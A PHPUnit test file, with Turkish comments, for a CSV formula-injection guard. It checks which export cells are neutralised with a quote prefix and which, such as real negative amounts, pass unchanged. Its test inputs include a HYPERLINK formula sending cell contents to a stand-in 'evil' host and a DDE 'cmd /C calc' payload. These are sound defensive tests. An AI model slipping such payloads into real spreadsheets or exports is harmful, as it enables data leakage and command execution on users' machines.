<?php

namespace Tests\Unit;

use App\Services\Reports\Support\MoneyFormatter;
use App\Support\CsvFormulaGuard;
use PHPUnit\Framework\TestCase;

/**
 * Faz 13 / H2 (F1) — CsvFormulaGuard sözleşmesi: hangi hücreler nötrlenir,
 * hangileri DOKUNULMADAN geçer. Export'un kendisi (LogQueryService,
 * app/Exports/*, ReportExportService) bu davranışa körü körüne güvenir —
 * burada kayan bir kural ya gerçek bir formülü kaçırır ya da meşru bir
 * tutarı bozar.
 */
class CsvFormulaGuardTest extends TestCase
{
    // ---------------------------------------------------------------
    // Tehlikeli önekler — nötrlenmeli
    // ---------------------------------------------------------------

    public function test_equals_prefixed_formula_is_neutralized(): void
    {
        $this->assertSame(
            "'=HYPERLINK(\"http://evil/\"&A1)",
            CsvFormulaGuard::sanitizeCell('=HYPERLINK("http://evil/"&A1)')
        );
    }

    public function test_plus_prefixed_non_numeric_expression_is_neutralized(): void
    {
        $this->assertSame("'+1+1", CsvFormulaGuard::sanitizeCell('+1+1'));
    }

    public function test_at_prefixed_formula_is_neutralized(): void
    {
        $this->assertSame("'@SUM(A1)", CsvFormulaGuard::sanitizeCell('@SUM(A1)'));
    }

    public function test_tab_prefixed_value_is_neutralized(): void
    {
        $this->assertSame("'\tzararlı", CsvFormulaGuard::sanitizeCell("\tzararlı"));
    }

    public function test_carriage_return_prefixed_value_is_neutralized(): void
    {
        $this->assertSame("'\rzararlı", CsvFormulaGuard::sanitizeCell("\rzararlı"));
    }

    public function test_minus_prefixed_non_numeric_expression_is_neutralized(): void
    {
        // Gerçek bir tutar DEĞİL — "-2+3+cmd|..." kalıbı Excel'de formül
        // olarak yorumlanabilir (Karar 1).
        $this->assertSame("'-2+3+cmd|' /C calc'!A1", CsvFormulaGuard::sanitizeCell("-2+3+cmd|' /C calc'!A1"));
    }

    // ---------------------------------------------------------------
    // Karar 1'in regresyonu — GERÇEK negatif sayısal string'ler bozulmaz
    // ---------------------------------------------------------------

    public function test_negative_decimal_amount_string_is_left_untouched(): void
    {
        // MoneyFormatter::normalize() bcmath ile hep string döner; rapor
        // export'undaki "tutar" hücreleri bu biçimdedir.
        $this->assertSame('-1500.00', CsvFormulaGuard::sanitizeCell('-1500.00'));
    }

    public function test_positive_decimal_amount_string_is_left_untouched(): void
    {
        $this->assertSame('+1500.00', CsvFormulaGuard::sanitizeCell('+1500.00'));
    }

    public function test_negative_integer_amount_string_is_left_untouched(): void
    {
        $this->assertSame('-1500', CsvFormulaGuard::sanitizeCell('-1500'));
    }

    /**
     * Uygulamanın kendi para formatlayıcısıyla üretilen değer, guard'dan
     * BOZULMADAN geçmeli — üretim kod yolunu doğrudan bağlar.
     */
    public function test_money_formatter_negative_output_survives_the_guard(): void
    {
        $formatted = MoneyFormatter::normalize(-1500);

        $this->assertSame('-1500.00', $formatted);
        $this->assertSame($formatted, CsvFormulaGuard::sanitizeCell($formatted));
    }

    // ---------------------------------------------------------------
    // Tip bazlı davranış — int/float/bool/null'a hiç dokunulmaz
    // ---------------------------------------------------------------

    public function test_native_int_is_untouched(): void
    {
        $this->assertSame(-1500, CsvFormulaGuard::sanitizeCell(-1500));
    }

    public function test_native_float_is_untouched(): void
    {
        $this->assertSame(-1500.5, CsvFormulaGuard::sanitizeCell(-1500.5));
    }

    public function test_bool_and_null_are_untouched(): void
    {
        $this->assertTrue(CsvFormulaGuard::sanitizeCell(true) === true);
        $this->assertFalse(CsvFormulaGuard::sanitizeCell(false) === true);
        $this->assertNull(CsvFormulaGuard::sanitizeCell(null));
    }

    // ---------------------------------------------------------------
    // Sınır durumları
    // ---------------------------------------------------------------

    public function test_empty_string_is_untouched(): void
    {
        $this->assertSame('', CsvFormulaGuard::sanitizeCell(''));
    }

    public function test_lone_dash_is_neutralized(): void
    {
        // Tek başına "-" saf sayısal desenle EŞLEŞMEZ (rakam yok) —
        // tutarlılık için muhafazakâr davranış: nötrle.
        $this->assertSame("'-", CsvFormulaGuard::sanitizeCell('-'));
    }

    public function test_plain_text_is_untouched(): void
    {
        $this->assertSame('Ahmet Yılmaz', CsvFormulaGuard::sanitizeCell('Ahmet Yılmaz'));
    }

    public function test_turkish_characters_are_untouched(): void
    {
        $this->assertSame('İstanbul Şirketi Öğüt A.Ş.', CsvFormulaGuard::sanitizeCell('İstanbul Şirketi Öğüt A.Ş.'));
    }

    // ---------------------------------------------------------------
    // sanitizeRow — satır bazlı yardımcı
    // ---------------------------------------------------------------

    public function test_sanitize_row_maps_over_every_cell_and_preserves_keys(): void
    {
        $row = [1, '=cmd', 'normal', -1500.00, null];

        $this->assertSame([1, "'=cmd", 'normal', -1500.00, null], CsvFormulaGuard::sanitizeRow($row));
    }
}
